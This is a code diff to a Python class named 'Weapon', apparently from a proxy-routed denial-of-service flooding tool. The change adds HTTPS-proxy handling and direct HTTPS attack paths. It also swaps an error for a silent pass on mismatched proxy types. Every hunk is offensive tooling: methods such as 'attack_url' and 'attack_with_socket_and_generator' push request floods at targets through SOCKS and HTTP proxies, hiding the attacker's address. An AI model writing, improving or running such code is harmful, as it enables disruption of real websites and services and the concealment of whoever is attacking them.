@@ -20,6 +20,8 @@ class Weapon(Observable):
             s.set_proxy(socks.SOCKS4, proxy.IP, int(proxy.PORT))
         elif proxy.TYPE == 'socks5':
             s.set_proxy(socks.SOCKS5, proxy.IP, int(proxy.PORT))
+        elif proxy.TYPE == 'https' and target.PROTOCOL == 'https':
+            s.set_proxy(socks.HTTP, proxy.IP, int(proxy.PORT))
         else:
             raise Exception('Invalid proxy type')
         s.settimeout(self.__config.TIMEOUT)
@@ -89,23 +91,22 @@ class Weapon(Observable):
             self.attack_with_socket_and_generator(target, s, self.extended_url_request_generator)
 
     def attack_url_https(self, target, proxy):
-        port = target.PORT
-        if port == 443:
-            port = 80
-        self.attack_url_http(Target(target.HOST, port, target.PATH, 'http'), proxy)
+        s = self.establish_connection_socks(target, proxy)
+        if s != None:
+            self.attack_with_socket_and_generator(target, s, self.simple_url_request_generator)
 
     def attack_url_http_s(self, target, proxy):
-        if target.PROTOCOL == 'http':
+        if target.PROTOCOL == 'http' and proxy.TYPE == 'http':
             self.attack_url_http(target, proxy)
-        elif target.PROTOCOL == 'https':
+        elif target.PROTOCOL == 'https' and proxy.TYPE == 'https':
             self.attack_url_https(target, proxy)
         else:
-            raise Exception('Invalid proxy type')
+            pass
 
     def attack_url(self, target, proxy):
         if proxy.TYPE in ['socks4', 'socks5']:
             self.attack_url_socks(target, proxy)
-        elif proxy.TYPE in ['http']:
+        elif proxy.TYPE in ['http', 'https']:
             self.attack_url_http_s(target, proxy)
     
     def attack_unknown_protocol_socks(self, target, proxy):
